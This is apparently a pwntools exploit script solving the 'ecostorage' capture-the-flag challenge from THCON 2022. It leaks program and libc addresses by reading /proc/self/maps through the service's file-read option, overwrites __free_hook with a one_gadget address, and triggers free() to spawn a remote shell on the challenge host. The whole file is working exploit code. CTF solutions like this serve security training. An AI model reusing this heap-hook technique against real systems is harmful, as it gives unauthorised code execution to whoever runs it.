#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

exe = ELF('./ecostorage_patched')
libc = ELF('./libc-2.31.so')

host, port = "challenges1.thcon.party", "524"

p = remote(host,port)

def readfile(name):
  p.sendlineafter('>> ', '1')
  p.sendlineafter('Filename: ', name)

# read /proc/self/maps to leak prog & libc current mappings
readfile('/proc/self/maps')
p.recvuntil(': \n',drop=True)
prog = int(p.recvuntil('-',drop=True),16)
print('prog base = '+hex(prog))

p.recvuntil('[heap]\n', drop=True)

# calculate libc base
libc.address = int(p.recvuntil('-',drop=True),16)
print('libc base = '+hex(libc.address))

p.sendlineafter('>> ', '2')
p.sendlineafter('token: ', 'THCON2022')

onegadgets = one_gadget('./libc-2.31.so', libc.address)

# overwrite __free_hook with a one gadget
p.sendlineafter('access!\n', str(libc.sym['__free_hook'])+' '+str(onegadgets[8]))
# launch a free() by making scanf allocating a lot of char
p.sendlineafter('>> ', '0'*5000+'1')

p.interactive()

